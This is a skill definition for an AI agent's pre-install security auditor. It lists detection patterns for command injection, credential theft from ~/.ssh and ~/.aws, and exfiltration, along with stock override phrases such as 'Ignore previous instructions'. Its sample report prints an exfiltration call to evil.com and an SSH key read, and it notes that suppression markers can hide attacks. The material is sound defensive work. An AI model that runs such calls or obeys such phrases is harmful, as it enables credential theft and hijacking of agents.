---
name: skill-security-auditor
description: >
  Security audit and vulnerability scanner for AI agent skills before installation.
  Use when evaluating a skill from an untrusted source, auditing a skill directory
  or repo URL for malicious code, gating plugins/skill packages pre-install,
  scanning Python scripts for dangerous patterns (os.system, eval, subprocess,
  network exfiltration), detecting prompt injection in SKILL.md files, checking
  dependency supply chain risk, or verifying file system access stays within
  skill boundaries.
  Triggers: "audit this skill", "is this skill safe", "scan skill for security",
  "check skill before install", "skill security check", "skill vulnerability scan".
  NOT for general code review, linting, logic/bug review, or style critique —
  pre-install security/malware vetting of skill packages only. For security review
  of an in-flight code diff, use the built-in "security-review" skill; for a
  structure/quality/craft audit, use skill-creator instead.
version: 1.0
---

# Skill Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

> **Windows:** no `PYTHONUTF8=1` prefix needed — the script reconfigures its own stdout/stderr to UTF-8 (only Python < 3.7 falls back to the platform default, where the prefix helps). (macOS/Linux never need it.)

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Not performed — no live PyPI/npm CVE/advisory lookup; the supply-chain check is local typosquat and lookalike name-matching only (see next row) | — |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa")) <!-- noqa: SEC-AUDITOR -->
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

### Suppressing False Positives

A line can be excluded from code, prompt-injection, and dependency scanning by
adding a suppression directive to it. Any of these markers, appearing anywhere on
the line, causes that line to be skipped entirely:

- `noqa: SEC-AUDITOR` — works in any file (use as a trailing comment, e.g.
  `os.system(cmd)  # noqa: SEC-AUDITOR`, or inline in the line)
- `<!-- noqa: SEC-AUDITOR -->` — HTML/Markdown comment form for `.md` files
- `auditor:ignore-line` — alternative marker that works in any file type

Use this **only for reviewed false positives** — for example, a security tool that
legitimately contains `os.system` inside a regex definition, or documentation that
quotes a malicious pattern as a worked example. Suppressed lines are never
re-checked, so every suppression must be reviewed and signed off by a human: a
malicious author can hide real attacks behind these markers, so do not trust
suppressions added by a skill's own author without reading the surrounding code.

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Agent-Context Threats Reference

When the skill under audit wires a language model into trust-sensitive decisions — MCP servers/clients, tool-calling loops, persistent agent memory, RAG, or prompts assembled from untrusted input — apply the attack-class checklist in [references/ai-llm-attack-classes.md](references/ai-llm-attack-classes.md) (absorbed from Cloudflare's security-audit-skill, MIT). Core disciplines: a guardrail prompt is not a security boundary; authorization and action binding are separate controls; structured output narrows shape but does not establish authorization; prompt injection alone is not a finding — require a code-level boundary failure.

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
